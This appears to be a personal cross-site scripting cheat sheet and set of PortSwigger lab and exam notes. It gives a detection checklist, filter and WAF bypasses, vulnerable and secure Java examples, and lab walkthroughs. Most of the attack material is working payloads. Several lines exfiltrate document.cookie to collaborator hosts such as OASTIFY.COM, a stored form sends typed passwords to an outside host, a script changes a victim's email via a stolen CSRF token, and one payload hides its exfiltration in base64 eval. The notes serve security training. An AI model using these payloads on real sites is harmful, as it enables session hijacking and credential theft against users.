**XSS** is when an attacker injects malicious JavaScript into a web application that executes in another user's browser. The browser trusts the script because it appears to come from the legitimate site.


**Reflected** — payload is in the request, reflected back immediately in the response. Requires tricking the victim into clicking a crafted link.

**Stored** — payload is saved in the database and served to every user who views the affected page. No interaction needed beyond normal browsing.

**DOM-based** — the server is innocent. Vulnerable client-side JavaScript reads attacker-controlled data from a source (e.g. `location.search`) and writes it to a sink (e.g. `innerHTML`, `document.write`) without sanitization.

## Sources and Sinks (DOM XSS)

**Sources** — attacker-controlled data entry points:

```
location.search      location.hash       location.href
document.referrer    document.cookie     window.name
postMessage          localStorage        sessionStorage
```

**Sinks** — dangerous functions that execute or render content:

```
document.write()         innerHTML              outerHTML
eval()                   setTimeout()           setInterval()
location.href            location.assign()      location.replace()
jQuery $()               element.src            element.action
```

---

## Injection Points

- Search fields, comment boxes, username/profile fields (stored)
- URL query parameters, hash fragments (reflected/DOM)
- HTTP headers reflected in responses (`Referer`, `User-Agent`, `X-Forwarded-For`)
- JSON responses inserted into the DOM
- `postMessage` event listeners without origin validation
- `href`, `src`, `action`, `onclick` HTML attributes
- JavaScript string contexts, template literals
- AngularJS template expressions `{{}}`

---

## Checklist

### Detection

- [ ]  Inject a polyglot to identify the context and what gets filtered:

```
	<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

- [ ]  Run `%{abcdef123456789}` to bruteforce which characters are blocked by the server
- [ ]  Copy-paste the reflected element into a text file — rendered HTML hides some quote characters
- [ ]  Check the dev panel Elements tab to see exactly where input lands in the DOM
- [ ]  Use **CSP Evaluator** to check if a CSP is in place: `https://csp-evaluator.withgoogle.com/`
- [ ]  If `base-uri` is missing from CSP, the stored self-XSS upgrade technique applies
- [ ]  If character limit is ~23 chars, use **Tiny XSS Payloads**: `https://github.com/terjanq/Tiny-XSS-Payloads`

### When Tags Are Blocked

- [ ]  Use Burp Intruder to fuzz allowed tags — copy the full tag list from PortSwigger cheat sheet:

```
	<§§>
```

- [ ]  Then fuzz allowed events for the working tag:

```
	<svg><animatetransform%20§§=1>
```

- [ ]  URL encode spaces if you get a protocol error (parser splits payload on space):

```
	<svg><animatetransform%20onbegin=alert(1)>
```

### When Event Handlers Are Blocked

- [ ]  Try `<img src=javascript:alert(1)>`
- [ ]  Try attribute-based execution without event handlers:

html

```html
	" autofocus onfocus=alert(document.domain) x="
	javascript:alert(document.domain)       ← in href attribute
	${alert(1)}                             ← in template literal context
	{{constructor.constructor('alert(1)')()}}  ← AngularJS
```

### When Angle Brackets Are Blocked

- [ ]  Try breaking out of JS string context:

```
	';alert(1)//
	\';alert(1);//
	\'-alert(1)//
	\"+alert(1)}//
```

- [ ]  Try closing a script tag and opening a new one:

```
	</script><script>alert(1)</script>
```

### DOM XSS via postMessage

- [ ]  Check source for `addEventListener('message', ...)` — look for unsanitized use of `e.data`
- [ ]  Test in console first:


```javascript
	window.postMessage('<svg><animate onbegin=print() attributeName=x dur=1s>','*')
	window.postMessage('javascript:alert(1)//http:','*')
```

- [ ]  Deliver via iframe on exploit server:

```html
	<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<svg><animate onbegin=print() attributeName=x dur=1s>','*')">
```

- [ ]  For JSON.parse based listeners:


```html
	<iframe src="https://TARGET.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

---

## Attack Payloads

### Cookie Stealing

```javascript
fetch('https://OASTIFY.COM/?c='+document.cookie)
```


```html
<script>document.write('<img src="http://OASTIFY.COM?c='+document.cookie+'" />')</script>
```


```html
<svg><animatetransform onbegin=document.location='https://OASTIFY.COM/?c='+document.cookie>
```

Deliver via iframe:


```html
<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
```

### Password Capture (Stored XSS)

```html
<input name=username id=username>
<input type=password name=password onchange="
if(this.value.length)fetch('https://OASTIFY.COM',{
    method:'POST',
    mode:'no-cors',
    body:username.value+':'+this.value
});">
```

### CSRF via XSS (steal CSRF token and change email)


```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post','/my-account/change-email',true);
    changeReq.send('csrf='+token+'&email=attacker@evil.com');
}
</script>
```

### DOM Context Specific Payloads


```javascript
// document.write context — break out of tag
"><script>alert(1)</script>
"></select><script>alert(1)</script>

// innerHTML context — no script tags, use event handlers
<img src=x onerror=alert(1)>

// href attribute
javascript:alert(document.domain)

// JavaScript string with single quotes escaped
\';alert(1);//
\'-fetch('http://OASTIFY.COM?c='+btoa(document.cookie))//

// JavaScript string in template literal
${alert(1)}

// AngularJS expression
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('document.location="http://OASTIFY.COM/?c="+document.cookie')()}}

// Reflected DOM XSS (JSON response with escaped quotes)
\"+alert(1)}//
\"-fetch('http://OASTIFY.COM?c='+btoa(document.cookie))}//

// Stored DOM XSS (HTML stripped, use unclosed tag to break parser)
<><img src=1 onerror=alert(1)>
<><img src=1 onerror="window.location='http://OASTIFY.COM/c='+document.cookie">

// onclick with quotes HTML encoded and backslash escaped
http://foo?&apos;-alert(1)-&apos;

// Stored in anchor href with double quotes HTML encoded
javascript:alert(document.domain)
```

### WAF Bypass Payloads

```javascript
// Case variation
</ScRiPt><ScRiPt>alert(1)</ScRiPt>

// Bracket notation to bypass keyword filters
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"

// Base64 encoded eval
"+eval(atob("ZmV0Y2goImh0dHBzOi8vT0FTVElGWS5DT00vP2M9Iitkb2N1bWVudC5jb29raWUp"))}//

// String.fromCharCode to avoid quotes and keywords
document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))
```

---

## DOM Cookie Manipulation

When JS writes `window.location` into `document.cookie` unsanitized — inject via URL:

```html
<iframe src="https://TARGET.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;">
```

## DOM Open Redirect via location.href

Find the sink (`location.href`, `location.assign`) called with URL param:

```
GET /post?postId=5&url=https://exploit-server.net/exploit
```

---

## White Box Testing

**Vulnerable, reflected input written directly to response without encoding:**

java

```java
@GetMapping("/search")
public String search(@RequestParam String query, Model model) {
    // query is placed directly into the template without escaping
    model.addAttribute("query", query);
    return "search"; // template: <p>Results for: ${query}</p>
}
```

**Vulnerable, stored XSS, comment saved and rendered unescaped:**


```java
@PostMapping("/comment")
public ResponseEntity<?> postComment(@RequestBody CommentRequest req) {
    // content stored as-is, no sanitization
    commentRepository.save(new Comment(req.getContent()));
    return ResponseEntity.ok().build();
}

// Thymeleaf template using th:utext (unescaped) instead of th:text
// <p th:utext="${comment.content}"></p>  ← renders raw HTML including scripts
```

**Vulnerable, DOM XSS, user input written into innerHTML via REST API response:**

```java
@GetMapping("/api/username")
public ResponseEntity<String> getUsername(@AuthenticationPrincipal UserDetails user) {
    // username is stored with XSS payload, returned raw in JSON
    return ResponseEntity.ok(user.getUsername()); // no encoding
}
// Frontend JS: document.getElementById('name').innerHTML = data.username; ← sink
```

**Secure:**


```java
// Thymeleaf — always use th:text (HTML-encoded) never th:utext
// <p th:text="${comment.content}"></p>  ← encodes < > " ' &

// Encode output explicitly when building responses manually
import org.springframework.web.util.HtmlUtils;

@GetMapping("/search")
public String search(@RequestParam String query, Model model) {
    model.addAttribute("query", HtmlUtils.htmlEscape(query)); // encodes all HTML chars
    return "search";
}

// Sanitize rich HTML input using a whitelist library (never blacklist)
// Add OWASP Java HTML Sanitizer to pom.xml
PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeHtml = policy.sanitize(userInput);

// Set CSP header to restrict script execution as defence-in-depth
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'")
        )
    );
    return http.build();
}

// postMessage listeners must always validate origin
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted.com') return; // reject untrusted origins
    // process e.data safely
});
```

---
## LABS
**DOM XSS using web messages**

 Notice that the home page contains an addEventListener() call that listens for a web message

```html
<iframe src="https://0a2400760421f3368091f379005c00c3.web-security-academy.net/" onload="this.contentWindow.postMessage('<svg><animate onbegin=print() attributeName=x dur=1s>','*')">
```

When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload.

 **DOM XSS using web messages and a JavaScript URL**


i found this in the home page source code

```js
                   <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>
```

open the console and check for poc
```js
window.postMessage('javascript:alert(1)//http:', 'https://0a4700f1042e7de484a84021003a00ec.web-security-academy.net/');
```

```html 
<iframe src="https://0a080004042390a58102bba100a5000a.web-security-academy.net//" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

OR 


<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')">
```
//is for commenting the rest of the code

Without `//`, the browser expects a valid JavaScript expression following `print()`, but `http:` isn't valid JavaScript. As a result, the browser throws an error or fails to execute properly because `http:` is not valid JavaScript syntax.



 **DOM XSS using web messages and `JSON.parse`**
```html

<iframe src="https://0a6300dd04e0bb0a800eb73700750017.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

```

**DOM-based open redirection**

in the js file i found:
``` html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>**
```

you can see the sink **location.href**  and it is being called by `returnURL` = `/url`


```HTML
GET /post?postId=5&url=https://exploit-0a92006f0414f31e80cfbb9e01b5003d.exploit-server.net/exploit 
```


 **DOM-based cookie manipulation**

if JavaScript writes data from a source into `document.cookie` without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values:


```html
                       <script>
                            document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
                        </script>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
                        
```


```html

`<iframe src="https://web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://web-security-academy.net';window.x=1;">`

```


**DOM XSS using web messages and JSON.parse**


```html
<iframe src="https://0a03009c03110946c0d1aea2003700e0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

**Stored XSS into HTML context with nothing encoded**

> submit post in the comment

```
<script>alert("1");</script>
```


 **DOM XSS in `document.write` sink using source `location.search`**


>in the search break out form the img source 


```
"><script>alert("1");</script>
```

> exam version

```
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```
**DOM XSS in `innerHTML` sink using source `location.search`**

```
<img src=x onerror=alert("1")>

```


**DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**


?returnPath=javascript:alert(document.domain)


 **DOM XSS in jQuery selector sink using a hashchange event**


add this to the body in the exploitable server `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>` 
then  deliver to the victim


**Reflected XSS into attribute with angle brackets HTML-encoded**

`" autofocus onfocus=alert(document.domain) x="`

since sometime these < >  are blocked



**Stored XSS into anchor `href` attribute with double quotes HTML-encoded**


javascript:alert(document.domain)

insert this into the website since it is being called by` <a href> `



 **Reflected XSS into a JavaScript string with angle brackets HTML encoded**


```js
';alert("1")//';
```
overall the script                    
```js
var searchTerms = '';alert("1")//';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

**Exploiting cross-site scripting to steal cookies** 

``` js

<script> 
fetch("https:// burp collabrator ?cookie="+document.cookie);
</script>

```

> Other version

```js
<script>
document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');
</script>
```

**Exploiting cross-site scripting to capture passwords**
``` js

<input name=username id=username>
<input type=password name=password onchange="
if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ 

method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value 

});
">


```

**DOM XSS in `document.write` sink using source `location.search` inside a select element**

```
&storeId=</select><img src="something" onerror=alert(1)>

```

> URL encode it 

**DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
> payload of all things exploit
```
{{constructor.constructor('alert(1)')()}}
```

> Exam version
```
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```
 **Reflected DOM XSS**

```
\"+alert(1)}//
```


>Exam Version

```
\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```


**Stored DOM XSS**

```js
<><img src=1 onerror=alert(1)>
```

> Exam version
```
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```
 **Exploiting XSS to perform CSRF**


> CSRF protected use other user CSRF

> POC is done by the xmlhttp csrf burp feature

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() 
{    
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];    
var changeReq = new XMLHttpRequest();    
changeReq.open('post', '/my-account/change-email', true);    
changeReq.send('csrf='+token+'&email=test@test.com')};
</script>
```

**Reflected XSS with some SVG markup allowed**

 - first discover tag `<§§>`
 - then discover the event `<svg><animatetransform%20§§=1>`
 - URL encode 

```
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```


**Reflected XSS into HTML context with most tags and attributes blocked**


Bruteforce all tags , Find out, that payload gives 200 status. Use the next payload, to send it to victim:

```js
<script>

window.location.href="https://0a120004044565098156d034009700ef.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E"

</script>
```

> Exam version 


```
<script>
location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1>#x';
</script>
```

>ULR Encoded
```


<script>
location = 'https://kek.web-security-academy.net/?query=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fburp.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```


 **Reflected XSS into a JavaScript string with single quote and backslash escaped**

```
</script><script>alert(1)</script>
```

> Exam version

```
</script><script>document.location="http://burp.oastify.com/?c="+document.cookie</script>
```

**Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**


```
\';alert(1);//
\'-alert(1)//
```

>Exam version

```
\';document.location=`http://burp.oastify.com/?c=`+document.cookie;//
```

**Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**


```
http://foo?&apos;-alert(1)-&apos;
```

**Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

```
${alert(1)}
```


**DOM XSS in `document.write` sink using source `location.search` inside a select element**

see that there is  a sink in the source code

```
var stores = ["London","Paris","Milan"]; var store = (new URLSearchParams(window.location.search)).get('storeId');

document.write('<select name="storeId">'); 
if(store) { 
document.write('<option selected>'+store+'</option>'); } 

for(var i=0;i<stores.length;i++) { if(stores[i] === store) { continue; } document.write('<option>'+stores[i]+'</option>'); } document.write('</select>');
```


then later in the code we see that its looping around the array stored and  inserting the stored[i]

>escape the options  and select 
```url
?productId=1&storeId=something</option></select><script>alert(1)</script>
```
# References

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://www.christian-schneider.net/CsrfAndSameOriginXss.html
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)
